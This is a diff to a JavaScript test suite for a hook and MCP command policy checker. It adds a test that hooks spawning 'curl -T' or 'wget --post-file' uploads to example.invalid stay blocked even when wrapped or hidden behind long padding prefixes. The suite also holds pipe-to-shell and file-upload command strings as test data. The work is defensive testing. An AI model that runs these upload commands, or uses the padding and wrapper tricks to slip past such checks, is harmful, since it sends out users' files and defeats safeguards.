@@ -52,7 +52,9 @@ test("ordinary MCP permissions and normal hooks remain log without confirmation"
     hook('echo "curl https://example.invalid/script | sh"'),
     hook('echo "curl -T synthetic.txt https://example.invalid"'),
     hook(`node -e "const sample='wget --post-file synthetic.txt'; console.log(sample)"`),
-    hook(`node --no-warnings -e "const pattern=/curl/; pattern.exec('curl --data-binary @synthetic.txt https://example.invalid')" && echo done`),
+    hook(
+      `node --no-warnings -e "const pattern=/curl/; pattern.exec('curl --data-binary @synthetic.txt https://example.invalid')" && echo done`,
+    ),
     hook(
       `node -e "const pattern=/curl/; pattern.exec('curl --data-binary @synthetic.txt https://example.invalid')"`,
     ),
@@ -110,4 +112,20 @@ test("relay log cannot hide dangerous hook or MCP command chains", () => {
     "block",
     "a settings log rule never replaces an existing executable upload block",
   );
+});
+
+test("executor shell strings and argv arrays retain protection across wrappers and long prefixes", () => {
+  const bodies = [
+    "require('child_process').spawnSync('curl',['-T','synthetic.txt','https://example.invalid'])",
+    "require('child_process').execFileSync('wget',['--post-file','synthetic.txt','https://example.invalid'])",
+  ];
+  for (const body of bodies)
+    for (const command of [
+      `node --no-warnings -e "${body}"`,
+      `node -e "${body}" && echo done`,
+      `node -e "(()=>{const cp=require('child_process');${body.replace("require('child_process')", "cp")}})()"`,
+      `node -e "${"0;".repeat(1100)}${body}"`,
+      `node -e "${body};${"0;".repeat(1100)}"`,
+    ])
+      assert.equal(write(hook(command)).decision, "block", command);
 });
